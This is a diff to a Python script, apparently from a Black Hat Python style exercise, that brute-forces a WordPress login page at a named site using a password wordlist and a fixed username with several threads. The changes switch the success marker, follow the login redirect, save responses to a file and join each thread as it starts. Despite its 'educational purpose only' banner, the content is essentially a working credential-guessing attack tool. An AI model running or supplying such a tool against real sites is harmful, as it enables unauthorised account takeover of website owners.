@@ -7,7 +7,10 @@ FOR EDUCATIONAL PURPOSE ONLY!! DO NOT USE ON TARGET WITHOUT EXPLICIT AUTHORISATI
 Improvements done:
 
 To improve:
-
+- add arguments
+- review redirect
+- add retry
+- handle multi language
 """
 import queue
 from io import BytesIO
@@ -19,7 +22,7 @@ import sys
 import threading
 import time
 
-SUCCESS = 'Tableau de bord'
+SUCCESS = 'Dashboard'
 TARGET = 'http://boodelyboo.com/wp-login.php'
 USER = 'toto'
 WORDLIST = '/tmp/BHP/cain-and-abel.txt'
@@ -57,6 +60,7 @@ class Bruter:
         for _ in range(10):
             t = threading.Thread(target=self.web_bruter, args=(passwords,))
             t.start()
+            t.join()
 
     def web_bruter(self, passwords):
         session = requests.Session()
@@ -68,13 +72,16 @@ class Bruter:
             passwd = passwords.get()
             print(f'Trying username/password {self.username}/{passwd:<10}')
             params['pwd'] = passwd
-            resp1 = session.post(self.url, data=params)
-            if SUCCESS in resp1.content.decode():
+            session.post(self.url, data=params)
+            resp3 = session.get(params['redirect_to'])
+            with open('/tmp/BHP/response', 'w') as f:
+                f.write(resp3.content.decode())
+            if SUCCESS in resp3.content.decode():
+                self.found = True
                 print('\nBruteforcing succesfull.')
                 print(f'\tUserName: {self.username}.')
                 print(f'\tPassword: {passwd}.')
                 print('Done: now cleaning up other threads...')
-                self.found = True
 
 
 def main():
